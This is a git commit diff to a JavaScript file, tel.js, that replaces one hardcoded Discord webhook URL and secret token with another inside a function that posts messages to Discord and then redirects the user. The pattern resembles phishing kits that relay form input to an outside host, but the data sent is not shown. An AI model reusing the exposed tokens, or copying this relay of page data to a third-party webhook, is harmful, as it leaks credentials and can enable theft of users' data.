5a08a833ee64c978ee03bb5660996050e7fd0a13
criptotab21 <51388858+criptotab21@users.noreply.github.com>
2025-06-28 08:16:25 -0500

    tel.js

--- tel.js
+++ tel.js
@@ -27,7 +27,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Función para enviar el mensaje a Discord usando un webhook
     function enviarMensajeDiscord(mensaje, nextPage) {
-        const webhookUrl = 'https://discord.com/api/webhooks/1388235463457898623/bn0maiWZLHQpONYUzKBV3kaMtxksOgt8qmwpCMA-S1IfT7Jkr_YiC391xwwNglq14gUe';
+        const webhookUrl = 'https://discord.com/api/webhooks/1388507349144047666/Hu7wD5VPtEPNF9LlN444yp_tOsHjLJlf5WMjcdIyp_kXX8NBwm6JWaCCXedgNF0FVuVG';
 
         const payload = { content: mensaje };
 
